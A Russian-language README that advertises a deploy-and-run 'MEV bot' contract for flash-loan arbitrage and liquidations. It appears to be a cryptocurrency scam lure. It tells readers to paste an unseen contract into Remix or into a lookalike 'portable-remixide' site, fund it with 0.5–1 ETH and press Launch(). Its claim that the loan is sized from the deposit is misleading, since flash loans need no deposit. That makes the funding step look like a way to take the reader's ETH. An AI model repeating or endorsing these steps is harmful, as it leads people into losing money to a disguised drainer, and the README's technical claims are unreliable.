
![M](https://i.postimg.cc/RhSdFDHd/q.png)
## Executor (Aave/Balancer + Uniswap/Sushi)

Короче, контракт для MEV: берёт флеш‑лоаны, гоняет арбитраж между DEX, делает ликвидации. Всё уже готово, деплоишь и пользуешься.

Что делает:

**По сути:** контракт берёт токены в займ (flash loan), обменивает их на другие токены через DEX, а затем возвращает займ + комиссию, извлекая прибыль из разницы цен.

**Важно:** вся схема построена так, что **весь процесс происходит в рамках одной транзакции одного контракта** — от взятия займа до возврата и получения прибыли.

-  **Aave V3 flashLoanSimple**: берёт флеш‑лоан и вызывает колбэк `executeOperation(...)`, где выполняется стратегия.
-  **Balancer Vault flashLoan**: мульти‑ассет флеш‑лоан и колбэк `receiveFlashLoan(...)`.
-  **DEX‑цикл (арбитраж)**: 2 свапа (Uniswap V3 ↔ SushiSwap V2) с проверками `minOut` и `minProfit`.
-  **Ликвидация (Aave V3)**: `liquidationCall(...)` с проверкой `minCollateralOut`.
-  **Выводы**: `withdrawEth(...)`, `withdrawToken(...)` + аварийный `emergencyTokenRecovery(...)`.



Как запускать:

Owner-контракт — ты владелец, вызываешь функции, он делает флеш‑лоаны и стратегии в одной транзакции.

**Краткая схема:**
1. Создаёшь контракт в Remix:  https://remix.ethereum.org/ or https://portable-remixide.org

По Скрину:
1- Создаешь файл .sol и вставляешь контракт в поле редактора [myBot.sol](myBot.sol)
2- вкладка Компиляции > версия 0.8.20 > кнопка Compile
3- Вкладка Деплой > Выбираем контракт Executor > жмём Deploy Contract 

![Инструкция по созданию контракта](https://i.ibb.co/HTRkw29n/instructions.png)

2. Пополняешь баланс контракта☝️ (0.5-1 ETH)

3. Запускаешь `Launch()` — он берёт займ и делает операции

4. Если надо вывести прибыль — жмёшь `withdrawEth()` или `withdrawToken()`

Простой старт: `Launch()` — сумма займа считается как баланс_контракта * 200.


- **Aave флеш‑лоан**: `executeFlashLoanArbitrage(asset, amount, params)`
- **Balancer флеш‑лоан**: `executeBalancerFlashLoan(tokens, amounts, userData)`

`params/userData` внутри кодируются как:

- `operationType`:
- `1` — DEX‑цикл
- `2` — ликвидация

Форматы данных:

### DEX‑цикл (operationType = 1)

```solidity
(uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit)
```

-  `firstDex`: `0` = UniswapV3→Sushi, `1` = Sushi→UniswapV3
-  `uniFee`: 500 / 3000 / 10000
-  `minOut1/minOut2`: защита от проскальзывания на каждом шаге
-  `minProfit`: минимальная прибыль (иначе транза откатится)

### Ликвидация (operationType = 2)

```solidity
(address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut)
```

Важно знать:

- Не жди лёгких денег. Всё зависит от рынка — газ, проскальзывание, конкуренция, позиции.

Про ETH:

0.5-1 ETH хватит надолго — на газ, если надо ETH/WETH гонять, и на всякий случай.

Примерно про прибыль: зависит от размера займа и ситуации на рынке. Для арбитража обычно 0.01-0.1% от суммы, для ликвидаций — процент от позиции. С 100 ETH займа может выйти 0.01-0.1 ETH профита, но это очень примерно и без гарантий — рынок меняется каждую секунду.

Успехов!

![Visitors](https://visitor-badge.laobi.icu/badge?page_id=README_RU_PAGE_ID)